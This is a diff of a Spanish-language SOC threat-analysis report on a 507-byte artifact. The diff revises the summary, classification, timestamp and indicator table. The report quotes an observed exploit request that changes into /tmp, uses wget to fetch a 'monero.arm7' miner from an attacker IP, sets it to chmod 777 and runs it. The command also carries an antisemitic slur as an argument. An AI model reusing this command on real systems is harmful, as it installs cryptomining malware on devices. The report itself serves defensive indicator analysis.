@@ -4,16 +4,16 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto de 507 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.35. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 4 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
-- **Categoría:** `Payload`
 - **Riesgo:** `Medium`
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T20:17:11+00:00`
+- **Registrado:** `2026-08-09T20:17:11.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -51,10 +51,10 @@ GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\/31.56.209.XXX/monero.arm7;chmod+777+
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 190.179.128.XXX | static_analysis |
 | ip | 31.56.209.XXX | static_analysis |
-| hash | b56c539869fdf0eaae6831b7f05050b50f36e466d5a8bbec36600e0d17673a99 | static_analysis |
+| ip | 190.179.128.XXX | static_analysis |
 | command | GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\/31.56.209.XXX/monero.arm7;chmod+777+monero.arm7;./monero.arm7+jews;wget+http: | strings |
+| hash | b56c539869fdf0eaae6831b7f05050b50f36e466d5a8bbec36600e0d17673a99 | static_analysis |
 | ip | 176.65.139.XXX | artifact_source |
 
 ## 🔎 Triage
